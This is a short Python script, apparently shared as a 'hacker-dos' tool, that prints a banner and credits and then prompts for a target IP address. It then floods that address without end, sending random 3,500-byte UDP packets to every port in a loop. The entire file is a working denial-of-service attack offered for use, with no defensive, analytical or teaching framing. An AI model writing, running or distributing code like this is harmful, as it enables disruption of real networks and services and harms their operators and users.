#hackerdos'
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print('''  _    _            _             _              _  
 | |  | |          | |           | |            | | 
 | |__| | __ _  ___| | _____ _ __| |_ ___   ___ | | 
 |  __  |/ _` |/ __| |/ / _ \ '__| __/ _ \ / _ \| | 
 | |  | | (_| | (__|   <  __/ |  | || (_) | (_) | | 
 |_|  |_|\__,_|\___|_|\_\___|_|   \__\___/ \___/|_| 
                                                    
                                                    ''')
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : hacker-dos" + N + "   hacker Dos From - " + B + "" + R + "hackertool" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped :hackertool\033[0m")
print("\033[33mGithub:https://github.com/2hackertool/\033[0m")
print("enjoy hacker-dos tool")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Target's IP : ")
os.system("clear")
print("hackertool start attacking...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
